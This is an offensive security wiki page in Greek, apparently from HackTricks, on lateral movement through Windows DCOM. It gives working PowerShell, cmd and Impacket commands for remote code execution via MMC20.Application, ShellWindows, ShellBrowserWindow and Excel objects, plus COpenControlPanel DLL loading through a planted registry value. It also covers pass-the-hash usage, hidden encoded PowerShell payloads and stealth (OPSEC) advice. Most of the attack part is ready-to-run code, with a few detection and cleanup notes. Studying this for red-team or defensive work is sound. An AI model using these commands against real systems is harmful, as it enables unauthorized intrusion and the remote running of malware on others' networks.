# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

Η lateral movement μέσω DCOM είναι ελκυστική, επειδή επαναχρησιμοποιεί υπάρχοντες COM servers που εκτίθενται μέσω RPC/DCOM, αντί να δημιουργεί service ή scheduled task. Στην πράξη, αυτό σημαίνει ότι η αρχική σύνδεση ξεκινά συνήθως στη θύρα TCP/135 και στη συνέχεια μεταφέρεται σε δυναμικά εκχωρημένες υψηλές θύρες RPC.

## Προαπαιτούμενα & Παγίδες

- Συνήθως απαιτείται local administrator context στο target και ο απομακρυσμένος COM server πρέπει να επιτρέπει remote launch/activation.
- Από τις **14 Μαρτίου 2023**, η Microsoft επιβάλλει DCOM hardening στα υποστηριζόμενα συστήματα. Παλαιοί clients που ζητούν χαμηλό επίπεδο authentication κατά την activation ενδέχεται να αποτύχουν, εκτός αν διαπραγματευτούν τουλάχιστον `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Οι σύγχρονοι Windows clients συνήθως αναβαθμίζονται αυτόματα, επομένως τα τρέχοντα εργαλεία κατά κανόνα συνεχίζουν να λειτουργούν.<sup>[[3]](#references)</sup>
- Η χειροκίνητη ή scripted εκτέλεση μέσω DCOM απαιτεί γενικά TCP/135, καθώς και το dynamic RPC port range του target. Αν χρησιμοποιείτε το `dcomexec.py` του Impacket και θέλετε να επιστρέφεται output από τις εντολές, συνήθως χρειάζεστε επίσης SMB πρόσβαση στο `ADMIN$` (ή σε άλλο writable/readable share).
- Αν το RPC/DCOM λειτουργεί αλλά το SMB είναι αποκλεισμένο, το `dcomexec.py -nooutput` μπορεί και πάλι να είναι χρήσιμο για blind execution.

Γρήγοροι έλεγχοι:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

Για περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική, δείτε το [original MMC20.Application post](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Τα Distributed Component Object Model (DCOM) objects παρέχουν μια ενδιαφέρουσα δυνατότητα για network-based interactions με objects. Η Microsoft παρέχει ολοκληρωμένη τεκμηρίωση τόσο για το DCOM όσο και για το Component Object Model (COM), προσβάσιμη [εδώ για το DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) και [εδώ για το COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Μια λίστα εφαρμογών DCOM μπορεί να ανακτηθεί χρησιμοποιώντας την εντολή PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
Το αντικείμενο COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), επιτρέπει τη δημιουργία script για λειτουργίες των MMC snap-in. Συγκεκριμένα, αυτό το αντικείμενο περιέχει μια μέθοδο `ExecuteShellCommand` στο `Document.ActiveView`. Περισσότερες πληροφορίες σχετικά με αυτήν τη μέθοδο μπορείτε να βρείτε [εδώ](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Ελέγξτε το εκτελώντας:<sup>[[6]](#references)</sup>

Αυτή η δυνατότητα διευκολύνει την εκτέλεση εντολών μέσω δικτύου χρησιμοποιώντας μια εφαρμογή DCOM. Για την απομακρυσμένη αλληλεπίδραση με το DCOM ως admin, μπορεί να χρησιμοποιηθεί το PowerShell ως εξής:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Αυτή η εντολή συνδέεται στην εφαρμογή DCOM και επιστρέφει ένα instance του αντικειμένου COM. Στη συνέχεια, μπορεί να γίνει invoke της μεθόδου ExecuteShellCommand για την εκτέλεση μιας διεργασίας στον απομακρυσμένο host. Η διαδικασία περιλαμβάνει τα εξής βήματα:

Έλεγχος μεθόδων:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Απόκτηση RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Το τελευταίο όρισμα είναι το στυλ του παραθύρου. Το `7` διατηρεί το παράθυρο ελαχιστοποιημένο. Από επιχειρησιακής άποψης, η εκτέλεση που βασίζεται στο MMC συνήθως οδηγεί μια απομακρυσμένη διεργασία `mmc.exe` να δημιουργεί το payload σας, κάτι που διαφέρει από τα αντικείμενα που βασίζονται στον Explorer παρακάτω.

## ShellWindows & ShellBrowserWindow

**Για περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική, δείτε την αρχική ανάρτηση [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Διαπιστώθηκε ότι το αντικείμενο **MMC20.Application** δεν διαθέτει ρητά "LaunchPermissions", χρησιμοποιώντας από προεπιλογή δικαιώματα που επιτρέπουν την πρόσβαση στους Administrators. Για περισσότερες λεπτομέρειες, μπορείτε να δείτε [εδώ](https://twitter.com/tiraniddo/status/817532039771525120), ενώ συνιστάται η χρήση του OleView .NET του [@tiraniddo](https://twitter.com/tiraniddo) για το φιλτράρισμα αντικειμένων χωρίς ρητό Launch Permission.

Δύο συγκεκριμένα αντικείμενα, τα `ShellBrowserWindow` και `ShellWindows`, επισημάνθηκαν λόγω της έλλειψης ρητών Launch Permissions. Η απουσία μιας καταχώρισης `LaunchPermission` στο μητρώο, κάτω από το `HKCR:\AppID\{guid}`, σημαίνει ότι δεν υπάρχουν ρητά δικαιώματα.

Σε σύγκριση με το `MMC20.Application`, αυτά τα αντικείμενα είναι συχνά πιο αθόρυβα από την άποψη του OPSEC, επειδή η εντολή συνήθως καταλήγει να είναι child της `explorer.exe` στον απομακρυσμένο host αντί της `mmc.exe`.

### ShellWindows

Για το `ShellWindows`, το οποίο δεν διαθέτει ProgID, οι μέθοδοι .NET `Type.GetTypeFromCLSID` και `Activator.CreateInstance` διευκολύνουν την instantiation του αντικειμένου χρησιμοποιώντας το AppID του. Αυτή η διαδικασία αξιοποιεί το OleView .NET για την ανάκτηση του CLSID του `ShellWindows`. Μετά την instantiation, είναι δυνατή η αλληλεπίδραση μέσω της μεθόδου `WindowsShell.Item`, η οποία οδηγεί σε invocation μεθόδων όπως η `Document.Application.ShellExecute`.

Παρακάτω παρατίθενται παραδείγματα εντολών PowerShell για την instantiation του αντικειμένου και την απομακρυσμένη εκτέλεση εντολών:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

Το `ShellBrowserWindow` είναι παρόμοιο, αλλά μπορείτε να το δημιουργήσετε απευθείας μέσω του CLSID του και να κάνετε pivot στο `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement με Excel DCOM Objects

Το lateral movement μπορεί να επιτευχθεί μέσω εκμετάλλευσης DCOM Excel objects. Για λεπτομερείς πληροφορίες, συνιστάται να διαβάσετε τη συζήτηση σχετικά με την αξιοποίηση του Excel DDE για lateral movement μέσω DCOM στο [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Το project Empire παρέχει ένα PowerShell script που παρουσιάζει τη χρήση του Excel για remote code execution (RCE) μέσω χειρισμού DCOM objects. Παρακάτω παρατίθενται αποσπάσματα από το script που είναι διαθέσιμο στο [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), τα οποία παρουσιάζουν διαφορετικές μεθόδους abuse του Excel για RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Πρόσφατη έρευνα επέκτεινε αυτή την περιοχή με τη μέθοδο `ActivateMicrosoftApp()` του `Excel.Application`. Η βασική ιδέα είναι ότι το Excel μπορεί να προσπαθήσει να εκκινήσει παλαιότερες εφαρμογές της Microsoft, όπως FoxPro, Schedule Plus ή Project, αναζητώντας τες στο system `PATH`. Αν ένας operator μπορεί να τοποθετήσει ένα payload με ένα από τα αναμενόμενα ονόματα σε μια εγγράψιμη τοποθεσία που περιλαμβάνεται στο `PATH` του target, το Excel θα το εκτελέσει.<sup>[[4]](#references)</sup>

Απαιτήσεις για αυτή την παραλλαγή:

- Local admin στο target
- Εγκατεστημένο Excel στο target
- Δυνατότητα εγγραφής ενός payload σε έναν εγγράψιμο κατάλογο στο `PATH` του target

Πρακτικό παράδειγμα κατάχρησης της αναζήτησης FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Εάν ο host του επιτιθέμενου δεν έχει καταχωρισμένο το τοπικό `Excel.Application` ProgID, δημιουργήστε το remote object χρησιμοποιώντας το CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Τιμές που έχουν παρατηρηθεί να γίνονται abused στην πράξη:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — φόρτωση ενός καταχωρισμένου Control Panel DLL

Η κλάση `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) εκθέτει το `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Η μέθοδος `Open()` προκαλεί τη φόρτωση των Control Panel DLLs που είναι καταχωρισμένα κάτω από το κλειδί `Control Panel\Cpls` από ένα απομακρυσμένο `dllhost.exe`. Η κλάση δεν διαθέτει ρητά δικαιώματα εκκίνησης/πρόσβασης στα συστήματα που δοκιμάστηκαν, επομένως κληρονομεί την προεπιλεγμένη πολιτική DCOM (η οποία κανονικά απαιτεί administrator για απομακρυσμένη ενεργοποίηση). Ένα τυχαίο όνομα στοιχείου αρκεί για να κάνει η `Open()` επεξεργασία των καταχωρισμένων DLLs· το payload δεν χρειάζεται επέκταση `.cpl`, αν και πρέπει να είναι έγκυρο DLL της σωστής αρχιτεκτονικής.<sup>[[7]](#references)</sup>

Αυτό το primitive είναι **stage-and-trigger**, όχι εκτέλεση μόνο εντολών: πρώτα αντιγράψτε ένα DLL στον στόχο και δημιουργήστε μια τιμή `REG_EXPAND_SZ` που δείχνει σε αυτό, έπειτα ενεργοποιήστε το αντικείμενο μέσω DCOM. Για παράδειγμα, από ένα administrative Windows context:<sup>[[7]](#references)</sup>
```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```
Ο public client [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) υλοποιεί το undocumented DCOM call με το Impacket. Η παροχή ενός αυθαίρετου ονόματος στοιχείου του Control Panel είναι επαρκής· ο client μπορεί να αναφέρει σφάλμα RPC, παρόλο που το `dllhost.exe` φόρτωσε το DLL.<sup>[[8]](#references)</sup>
```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```
Από επιχειρησιακής άποψης, αυτή η διαδρομή απαιτεί επίσης ένα κανάλι εγγραφής αρχείων και απομακρυσμένη πρόσβαση στο registry, επομένως είναι πιο θορυβώδης από τις `MMC20`/`ShellWindows`. Δημιουργεί παρενέργεια persistence, επειδή το άνοιγμα του Control Panel αργότερα μπορεί να φορτώσει ξανά την ίδια καταχώριση. Αφαιρέστε την τιμή μετά την εκτέλεση και αναζητήστε μη αναμενόμενες τιμές `Control Panel\Cpls` σε συνδυασμό με ασυνήθιστες φορτώσεις DLL στο `dllhost.exe`.<sup>[[7]](#references)</sup>
```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```
### Εργαλεία Automation για Lateral Movement

Επισημαίνονται δύο εργαλεία για την αυτοματοποίηση αυτών των τεχνικών:

- **Invoke-DCOM.ps1**: Ένα PowerShell script που παρέχεται από το project Empire και απλοποιεί την κλήση διαφορετικών μεθόδων για την εκτέλεση κώδικα σε απομακρυσμένα μηχανήματα. Αυτό το script είναι διαθέσιμο στο GitHub repository του Empire.

- **SharpLateral**: Ένα εργαλείο σχεδιασμένο για την απομακρυσμένη εκτέλεση κώδικα, το οποίο μπορεί να χρησιμοποιηθεί με την εντολή:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Αυτόματα Εργαλεία

- Το Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) επιτρέπει την εύκολη εκτέλεση όλων των σχολιασμένων τρόπων για την εκτέλεση code σε άλλα μηχανήματα.
- Μπορείτε να χρησιμοποιήσετε το `dcomexec.py` του Impacket για την εκτέλεση commands σε απομακρυσμένα συστήματα μέσω DCOM. Οι τρέχουσες builds υποστηρίζουν τα `ShellWindows`, `ShellBrowserWindow` και `MMC20`, με προεπιλογή το `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Θα μπορούσατε επίσης να χρησιμοποιήσετε το [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Θα μπορούσατε επίσης να χρησιμοποιήσετε το [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [Lateral Movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement via DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Διαχείριση αλλαγών για την παράκαμψη της δυνατότητας ασφαλείας του Windows DCOM Server (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: Κατάχρηση της ισχύος της εφαρμογής DCOM Excel](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Αξιοποίηση του Excel DDE για lateral movement μέσω DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - Κλάση εφαρμογής MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Χρήση αντικειμένων DCOM για απομακρυσμένη εκτέλεση εντολών](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
{{#include ../../banners/hacktricks-training.md}}
